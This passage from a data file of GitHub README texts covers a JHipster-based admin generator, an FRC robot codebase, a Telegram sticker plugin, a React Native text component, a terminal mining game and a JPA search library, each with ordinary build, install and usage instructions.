  - [NetBeans](https://netbeans.apache.org/)

#### 3. Build `Sale Dock` with `Maven` (Optional):

```bash
cd saledock
mvn verify
```

## Deployment

- Open Installation Guide: [Installation Guide](docs/INSTALLATION_GUIDE.md)

## Contributors

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tbody>
    <tr>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/hardingadonis""><img src=""https://avatars.githubusercontent.com/u/34091632?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Minh Vương</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/bakaqc""><img src=""https://avatars.githubusercontent.com/u/126387856?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Đinh Quốc Chương</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/htnghia1423""><img src=""https://avatars.githubusercontent.com/u/137130942?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Thunder</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/yuhtnguyen""><img src=""https://avatars.githubusercontent.com/u/137138731?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Yuht</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/linhlm0210""><img src=""https://avatars.githubusercontent.com/u/147788973?v=4"" width=""100px;"" alt=""""/><br /><sub><b>linhlm0210</b></sub></a></td>
    </tr>
    <tr>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/thson58""><img src=""https://avatars.githubusercontent.com/u/152074875?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Nguyen Son</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://allcontributors.org""><img src=""https://avatars.githubusercontent.com/u/46410174?v=4"" width=""100px;"" alt=""""/><br /><sub><b>All Contributors</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://imgbot.net""><img src=""https://avatars.githubusercontent.com/u/31427850?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Imgbot</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://www.codefactor.io""><img src=""https://avatars.githubusercontent.com/u/13309880?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Automated code reviews</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/AnkitaGhosh2000""><img src=""https://avatars.githubusercontent.com/u/152983487?v=4"" width=""100px;"" alt=""""/><br /><sub><b>AnkitaGhosh2000</b></sub></a></td>
	</tr>
	<tr>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/SaibalCts23""><img src=""https://avatars.githubusercontent.com/u/153187590?v=4"" width=""100px;"" alt=""""/><br /><sub><b>SaibalCts23</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/AdrishOfHogwarts""><img src=""https://avatars.githubusercontent.com/u/152976845?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Adrish Bose</b></sub></a></td>
    </tr>
  </tbody>
</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

## Licenses:

- [Sale Dock](https://github.com/hardingadonis/saledock) is under the [Apache-2.0 license](https://github.com/hardingadonis/saledock/blob/main/LICENSE).
- [favicon](https://github.com/hardingadonis/saledock/blob/main/src/main/webapp/assets/images/favicon/favicon.png) is under the [flaticon](https://www.flaticon.com/free-icon/sale_791968).
",10,0,2,Apache-2.0
aditya-dua/JBDL-65,main,"Streams Assignment: https://gist.github.com/aditya-dua/ab7ccd91443a576fba55eacd682ec780
",0,0,1,
begcode/begcode-admin,main,"# monolithMybatis

本应用程序由BegCode8.6.3生成, 你可以在 [https://www.begcode.com](https://www.begcode.com) 找到文档和帮助。

## 截图展示

### 登录

![登录](./doc/images/login.png)

### 首页

![首页](./doc/images/index.png)

### 菜单列表

![菜单列表](./doc/images/view_permission.png)

### 角色列表

![角色列表](./doc/images/authority.png)

### 用户列表

![用户列表](./doc/images/user-list.png)

### 短信配置

![短信配置](./doc/images/sms_config.png)

### 图片上传

![图片上传](./doc/images/upload_image.png)

### 字典管理

![字典管理](./doc/images/dictionary.png)

### 操作日志

![操作日志](./doc/images/sys_log.png)

### 消息发布

![消息发布](./doc/images/announcement.png)

### Api列表

![Api列表](./doc/images/api.png)

### Icon选择参考

![Icon选择参考](./doc/images/icon_picker.png)

### 查看通知

![查看通知](./doc/images/notice.png)

## 项目结构

生成时需要 Node，并建议在开发过程中使用它。package.json 文件始终会生成，以提供更好的开发体验，包括 prettier、commit hooks、脚本等等。

在项目的根目录中，JHipster会生成用于配置诸如git、prettier、eslint、husky等众多常见工具的配置文件。你可以在网络上找到有关这些工具的参考文档。

`/src/*` 目录结构遵循默认的Java结构。

- `.yo-rc.json` - Yeoman配置文件（BegCode/JHipster配置文件）
  BegCode的配置存储在key为generator-begcode的属性中，这里定义了BegCode生成器的全局配置。此外，你可能会在项目根目录下的.yo-rc.json文件中找到类似generator-begcode-\*的蓝图配置，它包含了项目特定的配置选项。
- `.yo-resolve` (可选) - Yeoman 冲突解决器
  允许在发现冲突时使用特定操作，跳过匹配模式的文件的提示。每一行应该匹配 [模式] [操作]，其中模式是一个 Minimatch 模式，操作是 skip（如果省略则为默认操作）或者 force 中的一个。以 # 开头的行被视为注释，将被忽略。
- `.jhipster/*.json` - JHipster实体配置文件

- `npmw` - 用于本地安装的npm的包装器
  BegCode默认使用构建工具在本地安装Node和pnpm。此包装器确保本地安装pnpm并使用它，避免了不同版本可能引起的一些差异。通过使用./npmw而不是传统的npm，您可以配置一个无需Node的环境来开发或测试您的应用程序。
- `/src/main/docker` - 应用程序及其依赖的服务的Docker配置

## 开发

    构建系统将自动安装推荐的Node和pnpm版本。
    我们提供了一个包装器来启动 pnpm。

仅当 [package.json](package.json) 中的依赖项发生更改时，您才需要再次运行此命令。

```
./npmw install
```

我们使用 pnpm 脚本和 [Vite][] 作为我们的构建系统。

在两个单独的终端中运行以下命令，以创建更好的开发体验，其中当硬盘上的文件发生更改时您的浏览器自动刷新。

```
./mvnw
./npmw start
```

Npm 还用于管理此应用程序中使用的 CSS 和 JavaScript 依赖项。 您可以通过以下方式升级依赖项
在 [package.json](package.json) 中指定较新版本。 您还可以运行`pnpm update`和`pnpm install`来管理依赖项。
在任何命令上添加`help`标志以查看如何使用它。 例如，`pnpm help update`。

`./npmw run` 命令将列出可用于该项目运行的所有脚本。

## 系统构建

### 创建Jar包

要优化monolithMybatis应用程序创建Jar包并进行生产部署，请运行：

```
./mvnw package -Pprod clean verify -DskipTests
```

这将压缩客户端和重新打包CSS和JavaScript文件。 它还将修改`index.html`，以便引用这些新文件。
为了确保一切正常，请运行：

```
java -jar target/*.jar
```

然后在浏览器打开：[http://localhost:8080](http://localhost:8080)。

请参阅[Using JHipster in production][] 了解更多详细信息。

### 创建War包

要将您的应用程序打包为 war 以便将其部署到应用程序服务器，请运行：

```
./mvnw package -Pprod,war clean verify
```

### JHipster Control Center

JHipster Control Center 可以帮助您管理和控制您的应用程序。 您可以使用以下命令启动本地控制中心服务器（可通过 http://localhost:7419 访问）：

```
docker compose -f src/main/docker/jhipster-control-center.yml up
```

## 测试

### 运行Spring Boot 测试

要启动应用程序的测试，请运行：

```
./mvnw verify
```

### Client tests

Unit tests are run by [Jest][]. They're located in [front/src/test/javascript/](front/src/test/javascript/) and can be run with:

```
./npmw test
```

## 其他

### 使用Sonar进行代码质量控制

Sonar用于分析代码质量。 您可以使用以下命令启动本地 Sonar 服务器（可通过 http://localhost:9001 访问）：

```
docker compose -f src/main/docker/sonar.yml up -d
```

Note: we have turned off forced authentication redirect for UI in [src/main/docker/sonar.yml](src/main/docker/sonar.yml) for out of the box experience while trying out SonarQube, for real use cases turn it back on.

You can run a Sonar analysis with using the [sonar-scanner](https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner) or by using the maven plugin.

Then, run a Sonar analysis:

```
./mvnw -Pprod clean verify sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

If you need to re-run the Sonar phase, please be sure to specify at least the `initialize` phase since Sonar properties are loaded from the sonar-project.properties file.

```
./mvnw initialize sonar:sonar -Dsonar.login=admin -Dsonar.password=admin
```

Additionally, Instead of passing `sonar.password` and `sonar.login` as CLI arguments, these parameters can be configured from [sonar-project.properties](sonar-project.properties) as shown below:

```
sonar.login=admin
sonar.password=admin
```

For more information, refer to the [Code quality page][].

### Using Docker to simplify development (optional)

You can use Docker to improve your JHipster development experience. A number of docker-compose configuration are available in the [src/main/docker](src/main/docker) folder to launch required third party services.

For example, to start a mysql database in a docker container, run:

```
docker compose -f src/main/docker/mysql.yml up -d
```

To stop it and remove the container, run:

```
docker compose -f src/main/docker/mysql.yml down
```

You can also fully dockerize your application and all the services that it depends on.
To achieve this, first build a docker image of your app by running:

```
npm run java:docker
```

Or build a arm64 docker image when using an arm64 processor os like MacOS with M1 processor family running:

```
npm run java:docker:arm64
```

Then run:

```
docker compose -f src/main/docker/app.yml up -d
```

When running Docker Desktop on MacOS Big Sur or later, consider enabling experimental `Use the new Virtualization framework` for better processing performance ([disk access performance is worse](https://github.com/docker/roadmap/issues/7)).

For more information refer to [Using Docker and Docker-Compose][], this page also contains information on the docker-compose sub-generator (`jhipster docker-compose`), which is able to generate docker configurations for one or several JHipster applications.

## Continuous Integration (optional)

To configure CI for your project, run the ci-cd sub-generator (`jhipster ci-cd`), this will let you generate configuration files for a number of Continuous Integration systems. Consult the [Setting up Continuous Integration][] page for more information.

[BegCode最新文档]: https://www.begcode.com
[Node.js]: https://nodejs.org/
[NPM]: https://www.npmjs.com/
[Webpack]: https://webpack.github.io/
[BrowserSync]: https://www.browsersync.io/
[Jest]: https://facebook.github.io/jest/
[Leaflet]: https://leafletjs.com/
[DefinitelyTyped]: https://definitelytyped.org/
",0,1,1,MIT
BREAD5940/2024-Onseason,main,"# 2024 Onseason

![Robot Image](/assets/2024roti.jpeg)

---

Code for Team 5940's 2024 robot, Roti.

## Highlights
  - 6 Note Autonomous Mode
  - Dynamic 3-note rush autos for both the source and amp sides
  - Shoot-on-the-move
  - Trap climb

## Major Package Functions
- [`frc.robot.commons`](src/main/java/frc/robot/commons)

    Contains miscellaneous code that we use throughout the rest of the codebase.

- [`frc.robot.autonomous`](src/main/java/frc/robot/autonomous)

    Contains all our autonomous routines

- [`frc.robot.commands`](src/main/java/frc/robot/commands)

    Contains commands for controlling robot actions during both teleop and autonomous periods.

- [`frc.robot.subsystems`](src/main/java/frc/robot/subsystems)

    Contains state-machines for all our subsystems
",0,0,9,NOASSERTION
std-microblock/TGStickerProvider,master,"![header](./header.png)

## Telegram Stickers Provider
A Xposed/LSPosed plugin to dump stickers from Telegram. Almost all 3rd-party telegram clients are supported.

![screenshot](./screenshot.jpg)

### Release
You can download the latest release [here](https://t.me/microblock_pub/159).

### Compatibility

✅ NullGram  
✅ MDGram  
✅ Telegram (Official)  
✅ Telegram (Play)  
✅ AyuGram 

❎ Telegram X (and all its forks)

### Limitations
Only one Telegram client can be used to dump stickers at once. If the plugin is attached to multiple clients, only one of them could work, due to the limitation of Android. 

### Credits

This project used [YukiHookAPI](https://github.com/HighCapable/YukiHookAPI) and is greatly dependent on the source code of [Telegram Android](https://github.com/DrKLO/Telegram). Thanks!
",0,13,1,GPL-3.0
charmy/react-native-stroke-text,main,"# React Native Stroke/Outline Text

[![npm version](https://badge.fury.io/js/@charmy.tech%2Freact-native-stroke-text.svg)](https://badge.fury.io/js/@charmy.tech%2Freact-native-stroke-text)

Allows you to add stylish text with stroke effects to your mobile applications. It is perfect for creating visually
appealing text elements with outline effects.

<h1 align=""center"">
  <img width=""550"" src=""docs/example.jpeg""/>
</h1>

## Installation

```bash
npm install @charmy.tech/react-native-stroke-text
# or
yarn add @charmy.tech/react-native-stroke-text
```

## Android
min ```compileSdkVersion``` is required to be ```34```
## iOS
Go to your ios folder and run:

```
pod install
```

## Usage

Here's a quick example to get you started with StrokeText:

```jsx
import React from ""react"";
import { StrokeText } from ""@charmy.tech/react-native-stroke-text"";
import { View } from ""react-native"";

export default function Screen() {
  return (
    <View style={{ flex: 1, justifyContent: ""center"", alignItems: ""center"" }}>
      <StrokeText
        text=""Test""
        fontSize={50}
        color=""#000000""
        strokeColor=""#c334eb""
        strokeWidth={20}
        fontFamily=""Nunito-Black""
      />
    </View>
  );
}

```

### Props

The following table outlines the props available for the `StrokeText` component:

| Prop            | Type    | Description                                                     |
|-----------------|---------|-----------------------------------------------------------------|
| `text`          | string  | The text content you want to display.                           |
| `fontSize`      | number  | Size of the text font, defining how large the text will be.     |
| `color`         | string  | Color of the text, can use any valid color format.              |
| `strokeColor`   | string  | Color of the stroke (outline) around the text.                  |
| `strokeWidth`   | number  | Width of the stroke, determining the thickness of the outline.  |
| `fontFamily`    | string  | Font family for the text, should match available project fonts. |
| `align`         | string  | Text alignment (default: `center`)                              |
| `numberOfLines` | number  | Number of lines (default: `0`)                                  |
| `ellipsis`      | boolean | Ellipsis (...) (default: `false`)                               |
| `width`         | number  | Text width to enable ellipsis (default: `undefined`)            |

## Ellipsis

```jsx
<StrokeText
  text=""Lorem ipsum""
    width={150} // +
    ellipsis={true} // +
    numberOfLines={1} // +
  fontSize={32}
  color=""#FFFFFF""
  strokeColor=""#000000""
  strokeWidth={2}
  fontFamily=""Nunito-Black""
  align=""center""
/>

```

<h1 align=""center"">
  <img width=""450"" src=""docs/ellipsis.jpeg""/>
</h1>

## Custom Font

### Bare React Native

Create a `react-native.config.js` file in the root directory

```javascript
module.exports = {
  project: {
    ios: {},
    android: {},
  },
  assets: ['/assets/fonts'], // or './src/assets/fonts'
};
```

### Expo ([expo-font](https://docs.expo.dev/versions/latest/sdk/font/))

```tsx
import { useFonts } from ""expo-font"";
import { Dosis_400Regular } from ""@expo-google-fonts/dosis"";


const [fontsLoaded, fontError] = useFonts({
  Danfo: require(""./src/assets/fonts/Danfo-Regular.ttf""),
  ""Dosis-Regular"": Dosis_400Regular,
});
```

## Contributing

We welcome contributions to improve this component. Feel free to submit issues and enhancement requests.

## License

Please refer to the project's license for usage rights and limitations.
",11,4,1,MIT
RobertElderSoftware/robert-elder-software-java-modules,master,"#  CONTRIBUTING

DO NOT CREATE PULL REQUESTS FOR THIS PROJECT.

ANY PULL REQUESTS YOU CREATE WILL NOT BE MERGED IN.

This project does not currently accept pull requests from the public.

Having said this, please do file issues if you notice something broken or undesirable.

#  Terminal Block Mining Simulation Game

![Terminal Block Mining Simulation Game](block-mining-simulation-game-thumbnail.png ""Terminal Block Mining Simulation Game"")

This project contains the 'Terminal Block Mining Simulation Game', a video game where you simulate mining blocks of iron ore in the terminal.  The game uses procedural terrain generation and the game world itself is infinite.  The terrain will start generating automatically in the background near the player.  All generated terrain and player data is stored in a SQLite (or Postgres) database file.  The location of this world file defaults to the directory where you launch the game, but you can configure it with the '--block-world-file' flag.  You can also use the '--log-file' to set the location of a log file.  If the '--log-file' flag is omitted, logging will be disabled.

#  Player Movement

You can use the 'w', 'a', 's' 'd' keys to move around on the screen.  You can use the space bar to go up and the 'x' key to move down (assuming there isn't a solid block in the way on a different level).

#  Exiting/Quitting The Game

Press the 'q' key to quit the game.

#  Mining Blocks

Press the 'm' key to mine blocks.

#  Crafting

You can press the 'c' key to try and craft new blocks, such as metallic iron, and an iron pickaxe.  Currently, the game only supports four different crafting recipes:

-  Using wood to make a Wooden Pick Axe
-  Using stone and wood to make a Stone Pick Axe
-  Using iron oxide and wood to make Metallic Iron
-  Using metallic iron and wood to make an Iron Pick Axe

#  Place Blocks

Press the 'p' key to place blocks (currently only supports placing rock blocks).

#  In Game Help Menu

You can access an in-game help menu by pressing the 'ESC' key.

#  Switch Between Frames

You can switch focus between the 'frames' in the game's UI by pressing the 'TAB' key.

#  Command Line Arguments

You can run the .jar file with the '--help' flag to show a help menu:

```
java -jar block-mining-simulation-game-single-player-client-0.0.5.jar --help
```


```
Block Mining Simulation Game - Available Command-line Arguments:

--help                                     - Display this help menu.
--debug-arguments                          - Echo back info about the value of command line argument values were parsed, and what the default values are.
--log-file                        <arg>    - The name of the log file to use.  If not provided, there will be no logging.
--disable-jni                              - Disable the use of JNI (may cause some events like to window size changes to be ignored).
--restricted-graphics                      - Use only the simplest ASCII characters to produce graphics.  Required when running on non-graphical display ttys.
--allow-unrecognized-block-types           - Allow the game to run even when there are block types that aren't supported in the block schema.
--block-world-file                <arg>    - The name of the sqlite database file (SQLITE only).
--print-block-schema                       - Print current block schema and exit.
--block-schema-file               <arg>    - If specified, ignore the default built-in block schema and uses the one provided at file/path.
--print-user-interaction-config            - Print the current configuration that describes which keys control the game.
--user-interaction-config-file    <arg>    - If specified, ignore the default built-in user interaction config and uses the one provided at file/path.
--database-subprotocol            <arg>    - The protocol for the database connection string.  Currently supports 'postgresql' and 'sqlite'.
--database-hostname               <arg>    - The 'hostname' for the database connection. Can be IP address or DNS name.
--database-port                   <arg>    - The port for the database connection.
--database-name                   <arg>    - The 'name' of the database to connect to for the database connection string.
--database-username               <arg>    - The username for the database connection.
--database-password               <arg>    - The password for the database connection.
```

#  Supported Platforms

Currently, the game has only been tested to work on a default installation of Ubuntu Linux.

#  Launching The Game

Compiling the game from scratch is not necessary.  You can download pre-compiled .jar files from GitHub in the 'Releases' section for this repo:

```
wget https://github.com/RobertElderSoftware/robert-elder-software-java-modules/releases/download/0.0.5/block-mining-simulation-game-single-player-client-0.0.5.jar
java -jar block-mining-simulation-game-single-player-client-0.0.5.jar
```

The game should immediately launch and fill up the terminal with graphics.  You can exit the game by pressing the 'q' key.  By default, the game saves it's world data into a SQLite database file that lives in the current directory.

#  Verify The Jar Signature (Optional)

If you are concerned about the authenticity of the .jar file, you can also verify the signature using GPG:

```
wget https://github.com/RobertElderSoftware/robert-elder-software-java-modules/releases/download/0.0.5/block-mining-simulation-game-single-player-client-0.0.5.jar.asc
gpg --search-keys robert@robertelder.org
#  Should match the key for 'robert@robertelder.org'
gpg --recv-keys ECBD481DBCA5C48804FBD08720B9852CF0558BAA
gpg --verify block-mining-simulation-game-single-player-client-0.0.5.jar.asc block-mining-simulation-game-single-player-client-0.0.5.jar
```

The output should look something like this:

```
gpg: Signature made Thu 01 Aug 2024 01:49:03 PM EDT
gpg:                using ECDSA key ECBD481DBCA5C48804FBD08720B9852CF0558BAA
gpg: Good signature from ""Robert Elder (Created on 2024-07-31) <robert@robertelder.org>"" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: ECBD 481D BCA5 C488 04FB  D087 20B9 852C F055 8BAA
```

#  Building The Game

To build the game, you will need to set up a development environment that can support Java 17 and a version of maven that can support Java 17.

To build the JNI library, you will also need a c++ compiler and make

```
sudo apt-get install g++ make
```

Next, you can compile the game from source by running this command:

```
./res-modules/block-mining-simulation-game-single-player-client/run_single_player_client.sh
```

Once it finishes building, it should launch right into the game.

#  Alternative Key Mappings (Dvorak)

I received a couple requests to add support for reconfiguring the mapping of keyboard inputs, so I've added an option to specify a JSON config file where you can customize which input characters will trigger different actions in the game:

```
--user-interaction-config-file custom_key_config.json
```

For a Dvorak keyboard, I believe the following should work to give you the same experience that you'd get on a querty keyboard (although I can't say for sure as I don't have a Dvorak keyboard):

```
{
	""ACTION_TAB_NEXT_FRAME"": ""	"",
	""ACTION_HELP_MENU_TOGGLE"": """",
	""ACTION_Y_PLUS"": "","",
	""ACTION_Y_MINUS"": ""o"",
	""ACTION_X_PLUS"": ""e"",
	""ACTION_X_MINUS"": ""a"",
	""ACTION_Z_PLUS"": "" "",
	""ACTION_Z_MINUS"": ""q"",
	""ACTION_MINING"": ""m"",
	""ACTION_CRAFTING"": ""j"",
	""ACTION_QUIT"": ""'"",
	""ACTION_PLACE_BLOCK"": ""l""
}
```

You can see the default user interaction config file printed to standard out by running the jar with the following parameter:

```
--print-user-interaction-config
```

#  License

See LICENSE.md
",6,0,1,NOASSERTION
biagioT/jpa-search-helper,main,"
# JPA Search Helper

Library for building and running advanced and dynamic queries using JPA in Spring Boot.

## TL;DR
### Key features
- **Queries**: the library supports two modes for building advanced and dynamic queries:
  -  *Mode 1*: Via `Map<String, String>`, to support GET endpoints with query params.
  -  *Mode 2*: Via an [object](https://github.com/biagioT/jpa-search-helper/blob/main/src/main/java/app/tozzi/model/input/JPASearchInput.java), to support POST endpoints that expect query parameters in the body (from *2.0.0* version)
- **Projection**:  for both modes, the library allows you to extract only a subselection of fields from the query (from *3.2.0* version)

### Spoiler
Through **jpa-search-helper** your controller* will be able to receive requests like this:

*Mode 1*:
```bash  
curl -X GET \
  'https://myexampledomain.com/persons?
  firstName=Biagio
  &lastName_startsWith=Toz
  &birthDate_gte=19910101
  &country_in=IT,FR,DE
  &address_eq=Via Roma 1,Via Milano/,1,20 West/,34th Street
  &company.name_in=Microsoft,Apple,Google
  &company.employees_between=500,5000'
```  

*Mode 2*:
```bash  
curl -X POST -H ""Content-type: application/json"" -d '{
  ""filter"" : {
      ""operator"": ""and"", // the first filter must contain a root operator: AND, OR or NOT
      ""filters"" : [
        {
          ""operator"": ""eq"",
          ""key"": ""firstName"",
          ""value"": ""Biagio""
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""startsWith"",
              ""key"": ""lastName"",
              ""value"": ""Toz"",
              ""options"": {
                ""ignoreCase"": true
              }
            },
            {
              ""operator"": ""endsWith"",
              ""key"": ""lastName"",
              ""value"": ""ZZI"",
              ""options"": {
                ""ignoreCase"": true,
                ""trim"" : true
              }
            }
          ]
        },
        {
          ""operator"": ""in"",
          ""key"": ""company.name"",
          ""values"": [""Microsoft"", ""Apple"", ""Google""]
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""gte"",
              ""key"": ""birthDate"",
              ""value"": ""19910101""
            },
            {
              ""operator"": ""lte"",
              ""key"": ""birthDate"",
              ""value"": ""20010101""
            }
          ]
        },
        {
          ""operator"": ""between"",
          ""key"" : ""company.employees"",
          ""values"": [500, 5000],
          ""options"": {
            ""negate"": true
          }
        }
      ]
  },
  ""options"": {
    ""pageSize"": 10,
    ""pageOffset"": 0,
    ""sortKey"": ""birthDate"",
    ""sortDesc"": false
  }
  
}' 'https://myexampledomain.com/persons'
```  

..how you do it? Read this readme!

**\*** Please note:  the library does not expose controllers/HTTP Endpoints, but only offers the repository that will build and execute the queries.

## Compatibility Matrix

#### Minimum requirements
- Java 17 or later
- Spring Boot 3.2.x or later

| JPA Search Helper | Spring Boot | Java      |  
|------------------|-----------|-----------|  
| [v0.0.1 - v2.1.1] | 3.2.x     | [17 - 22] |  
| [v3.0.0 - latest] | 3.3.x     | [17 - 22] |  

## Project dependency
#### Maven
```  
<dependency>  
 <groupId>app.tozzi</groupId> 
 <artifactId>jpa-search-helper</artifactId> 
 <version>3.2.2</version>
</dependency>  
```  

#### Gradle
```  
implementation 'app.tozzi:jpa-search-helper:3.2.2  
```

## Queries - Usage
### 1. `@Searchable` annotation
Start by applying the `@Searchable` annotation to the fields in your Domain Model, or alternatively your JPA entity, **that you want to make available for search**.
If you have fields that you want to make searchable within other objects then annotate these with `@NestedSearchable`.

```java
@Data
public class Person {

  @Searchable
  private String firstName;

  @Searchable
  private String lastName;

  @Searchable(entityFieldKey = ""dateOfBirth"")
  private Date birthDate;

  @Searchable
  private String country;
  
  @Searchable
  private String fillerOne;
  
  @Searchable
  private String fillerTwo;

  @NestedSearchable
  private Company company;

  @Data
  public static class Company {

    @Searchable(entityFieldKey= ""companyEntity.name"")
    private String name;

    @Searchable(entityFieldKey= ""companyEntity.employeesCount"")
    private int employees;
  }
}
```
The annotation allows you to specify:

- Core properties:

  - `entityFieldKey`:
    the name of the field defined on the entity bean (not to be specified if using the annotation on the entity bean). If not specified the key will be the field name.
  - `targetType`: the managed object type by entity. If not specified the librariy tries to obtain it based on field type (es. Integer field without target type definition will be `INTEGER`). If there is no type compatible with those managed, it will be managed as a string. Managed types:

    - `STRING`, `INTEGER`, `DOUBLE`, `FLOAT`, `LONG`, `BIGDECIMAL`, `BOOLEAN`, `DATE`, `LOCALDATE`, `LOCALDATETIME`, `LOCALTIME`, `OFFSETDATETIME`, `OFFSETTIME`, `ZONEDDATETIME`.

- Validation properties:

  - `datePattern`: only for `DATE`, `LOCALDATE`, `LOCALDATETIME`, `LOCALTIME`, `OFFSETDATETIME`, `OFFSETTIME`, `ZONEDDATETIME` target types. Defines the date pattern to use.
  - `maxSize, minSize`: maximum/minimum length of the value.
  - `maxDigits, minDigits`: only for numeric types. Maximum/minimum number of digits.
  - `regexPattern`: regex pattern.
  - `decimalFormat`: only for decimal numeric types. Default `#.##`

- Other:
  - `sortable`: if false, the field can be used by search but cannot be used for sorting. Default: true.
  - `trim`: apply trim.
  - `tags`: useful if the Domain Model field can correspond to multiple entity fields (the example is available further down).
  - `allowedFilters`: exclusively allowed filters.
  - `notAllowedFilters`: not allowed filters.
  - `likeFilters`: allowed like filters (_contains_, _startsWith_, _endsWith_). Default: true.

Continuing the example, our entity classes:

```java
@Entity
@Data
public class PersonEntity {

  @Id
  private Long id;

  @Column(name = ""FIRST_NAME"")
  private String firstName;

  @Column(name = ""LAST_NAME"")
  private String lastName;

  @Column(name = ""BIRTH_DATE"")
  private Date dateOfBirth;

  @Column(name = ""COUNTRY"")
  private String country;

  @Column(name = ""FIL_ONE"")
  private String fillerOne;

  @Column(name = ""FIL_TWO"")
  private String fillerTwo;

  @OneToOne
  private CompanyEntity companyEntity;

}

@Entity
@Data
public class CompanyEntity {

  @Id
  private Long id;

  @Column(name = ""NAME"")
  private String name;

  @Column(name = ""COUNT"")
  private Integer employeesCount;

}
```

### 2. `JPASearchRepository` interface
Your Spring JPA repository must extend `JPASearchRepository<YourEntityClass>`.

```java
@Repository
public interface PersonRepository extends JpaRepository<PersonEntity, Long>, JPASearchRepository<PersonEntity> {

}
```

### 3. Search implementation
In your manager, or in your service, or wherever you want to use the repository:

**Mode 1**: define a map _<filter_key#options, value>_:
```java
// ...

  @Autowired
  private PersonRepository personRepository;

  public List<Person> advancedSearch() {
  
	// Pure example, in real use case it is expected that these filters can be passed directly by the controller
    Map<String, String> filters = new HashMap<>();
    filters.put(""firstName_eq"", ""Biagio"");
    filters.put(""lastName_startsWith#i"", ""Toz""); // ignore case
    filters.put(""birthDate_gte"", ""19910101""); 
    filters.put(""country_in"", ""IT,FR,DE"");
    filters.put(""company.name_eq#n"", ""Bad Company""); // negation
    filters.put(""company.employees_between"", ""500,5000"");
    filters.put(""fillerOne_null#n"", ""true""); // not null
    filters.put(""fillerTwo_empty"", ""true""); // empty
    
    // Without pagination
    List<PersonEntity> fullSearch = personRepository.findAll(filters, Person.class);
  
    filters.put(""birthDate_sort"" : ""ASC""); // sorting key and sorting order
    filters.put(""_limit"", ""10""); // page size
    filters.put(""_offset"", ""0""); // page offset
    
    // With pagination
    Page<PersonEntity> sortedAndPaginatedSearch = personRepository.findAllWithPaginationAndSorting(filters, Person.class);
    
    // ...
  }

// ...
```

**Mode 2**: instead of a map, you will need to use [`JPASearchInput`](https://github.com/biagioT/jpa-search-helper/blob/main/src/main/java/app/tozzi/model/input/JPASearchInput.java), shown here, for simplicity, in JSON format.

```json
{
  ""filter"" : {
      ""operator"": ""and"", // the first filter must contain a root operator: AND, OR or NOT
      ""filters"" : [
        {
          ""operator"": ""eq"",
          ""key"": ""firstName"",
          ""value"": ""Biagio""
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""startsWith"",
              ""key"": ""lastName"",
              ""value"": ""Toz"",
              ""options"": {
                ""ignoreCase"": true
              }
            },
            {
              ""operator"": ""endsWith"",
              ""key"": ""lastName"",
              ""value"": ""ZZI"",
              ""options"": {
                ""ignoreCase"": true,
                ""trim"" : true
              }
            }
          ]
        },
        {
          ""operator"": ""in"",
          ""key"": ""company.name"",
          ""values"": [""Microsoft"", ""Apple"", ""Google""]
        },
        {
          ""operator"": ""or"",
          ""filters"": [
            {
              ""operator"": ""gte"",
              ""key"": ""birthDate"",
              ""value"": ""19910101""
            },
            {
              ""operator"": ""lte"",
              ""key"": ""birthDate"",
              ""value"": ""20010101""
            }
          ]
        },
        {
          ""operator"": ""empty"",
          ""key"": ""fillerOne"",
          ""options"": {
            ""negate"": true
          }
        },
        {
          ""operator"": ""between"",
          ""key"" : ""company.employees"",
          ""values"": [500, 5000],
          ""options"": {
            ""negate"": true
          }
        }
      ]
  },
  ""options"": {
    ""pageSize"": 10,
    ""pageOffset"": 0,
    ""sortKey"": ""birthDate"",
    ""sortDesc"": false
  }
  
}
```
Through *Mode 2* it is possible to manage complex filters with `AND`, `OR` and `NOT` (see later).

#### Exceptions:
- If a field does not exist, is not searchable or is not sortable, you will receive an `InvalidFieldException`.
- If the value of a field does not meet the requirements you will receive an `InvalidValueException`.
- Other cases: `JPASearchException`

## Queries - Docs
### Managed root operators
| Filter name | Library Key | Supported modes |
|-------------|-------------|-----------------|
| AND         | and         | 1, 2            |
| OR          | or          | 2               |
| NOT         | not         | 2               |

Through *Mode 1*, all filters compose exclusively an `AND` search.

To use the other operators, `OR` and `NOT`, you must use *Mode 2*

### Managed search filter operators
| Filter name               | Library Key | SQL                                | Supported modes | Value required |
|---------------------------|-------------|------------------------------------|-----------------|----------------|
| Equals                    | eq          | sql_col = val                      | 1,2 | yes            |
| Contains                  | contains    | sql_col LIKE '%val%'               | 1,2 | yes            |
| In                        | in          | sql_col IN (val1, val2, ..., valN) | 1,2 | yes            |
| Starts With               | startsWith  | sql_col LIKE 'val%'                | 1,2 | yes            |
